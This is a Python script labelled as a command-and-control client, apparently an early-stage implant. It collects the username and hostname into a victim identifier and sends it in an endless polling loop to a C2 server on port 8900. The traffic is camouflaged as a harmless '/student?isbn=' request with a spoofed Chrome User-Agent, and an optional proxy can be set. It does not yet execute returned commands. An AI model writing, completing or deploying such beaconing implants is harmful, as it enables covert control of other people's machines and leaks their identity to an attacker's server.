#!/bin/python3

"""
C2 Client side code
"""
import platform, socket, time
from requests import exceptions, get
from os import getenv, uname


PORT=8900
PROXY = None
C2_SERVER = "localhost"
CMD_REQUEST = "/student?isbn="


timestamp = str(int(time.time()))
# Check the operating system
if platform.system() == "Windows":
    # Windows environment
    client = getenv("USERNAME", "Unknown_User") + "@" + getenv("COMPUTERNAME", "Unknown_ComputerName") + "_" + timestamp
else:
    # Linux environment
    client = getenv("USER", "Unknown_User") + "@" + uname().nodename + "_" + timestamp

HEADER: dict[str, str] = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# PROXY = {"https": "proxy.some-site.com:443"}
while True:
    try:
        cmd = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}', headers=HEADER, proxies=PROXY)
        print(f"Response Object: {cmd.request.headers}\n\tHeader: {cmd.headers}\n\tReason: {cmd.reason}\n\tStatus: {cmd.status_code}")
    except exceptions.RequestException as e:
        print(f"Server down - error: {e}")
        time.sleep(3)
        continue

